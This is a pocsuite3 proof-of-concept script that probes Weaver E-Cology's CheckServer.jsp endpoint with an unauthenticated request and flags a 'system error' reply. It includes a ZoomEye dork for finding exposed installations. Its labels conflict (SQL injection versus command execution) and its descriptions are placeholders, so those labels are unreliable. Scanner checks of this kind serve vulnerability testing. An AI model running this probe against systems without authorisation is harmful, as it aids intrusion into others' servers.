import json

from pocsuite3.api import (
    minimum_version_required, POCBase, register_poc, requests, logger,
    OptString, OrderedDict,
    random_str,
    CEye,
    get_listener_ip, get_listener_port, REVERSE_PAYLOAD
)
from urllib.parse import urljoin
minimum_version_required('1.9.11')


class POC(POCBase):
    name = '泛微E-Cology_checkserver.jsp_sqli'
    vulType = 'Command Execution'
    desc = 'Vulnerability description'
    pocDesc = 'User manual of poc'
    dork = {'zoomeye': 'app:"泛微协同管理应用平台e-cology"'}

    def _verify(self):
        try:
            result = {}
            vuln_path = '/mobile/plugin/CheckServer.jsp?type=mobileSetting'
            url = urljoin(self.url,vuln_path)
            res = requests.get(url,verify=False,timeout=5)
            resj = res.json()
            if resj['error'] == "system error":
                result['VerifyInfo'] = {}
                result['VerifyInfo']['url'] = self.url
                result['VerifyInfo']['flag'] = resj
                return self.parse_output(result)
        except json.JSONDecodeError:
            pass


register_poc(POC)
